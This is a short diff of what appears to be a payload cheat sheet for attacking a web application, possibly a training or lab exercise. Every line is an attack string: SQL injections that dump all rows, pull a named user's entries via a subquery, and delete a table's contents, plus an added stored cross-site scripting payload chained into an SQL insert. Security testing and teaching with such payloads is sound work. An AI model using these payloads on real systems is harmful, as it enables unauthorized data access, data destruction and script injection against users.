@@ -2,7 +2,10 @@ show all (WHITESPACE!):
 %') OR '1'='1'; -- '
 
 show all from user with name:
-%') OR '1'='1' AND user_id=(SELECT id FROM user WHERE login='karin'); -- '
+%') OR '1'='1' AND user_id=(SELECT id FROM user WHERE login='johann.farm'); -- '
+
+client:
+<script type="text/javascript" language="JavaScript">alert();</script>', 1, Sysdate()); -- '
 
 drop table:
 '; DELETE FROM entry; -- '
